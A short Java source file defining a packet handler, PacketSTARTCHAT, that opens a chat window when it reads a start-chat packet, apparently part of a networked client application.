package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.FrameChat;

public class PacketSTARTCHAT extends Packet {

	@Override
	public void read(String line) throws Exception {
		Connection.frameChat = new FrameChat();
		Connection.frameChat.setVisible(true);
	}

}
